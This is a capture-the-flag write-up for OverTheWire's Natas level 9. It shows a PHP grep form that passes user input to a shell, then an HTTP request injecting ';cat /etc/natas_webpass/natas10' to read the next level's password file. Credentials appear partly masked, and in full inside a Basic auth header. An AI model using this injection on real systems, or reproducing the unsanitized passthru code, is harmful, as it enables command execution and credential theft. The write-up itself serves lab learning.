# level 9

**Host**: http://natas9.natas.labs.overthewire.org
>natas9:ZE1ck82lmdGIoErlhQgWND**********

When you visit the site, you get a formfield saying "Find words containing:".

```
Find words containing:
```

### Solution:

When you click on the "View source" link you get following php code:

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

The interesting part ist the "grep -i $key dictionary.txt" which indicates that you can inject commands because there is no input sanitization. You can add a `cat /etc/natas_webpass/natas10` to your request:

```http
GET /?needle=test%3bcat+/etc/natas_webpass/natas10&submit=Search HTTP/1.1
Host: natas9.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM5OlpFMWNrODJsbWRHSW9FcmxoUWdXTkQ2ajJXeno2YjZ0
Connection: keep-alive
Referer: http://natas9.natas.labs.overthewire.org/?needle=&submit=Search
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

This gives you the password for natas10 in the response:

```html
HTTP/1.1 200 OK
Date: Wed, 03 Sep 2025 18:43:20 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 461935

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
</head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
t7I5VHvpa14sJTUGV0cbEs**********

African
Africans
Allah
Allah's
American
...
```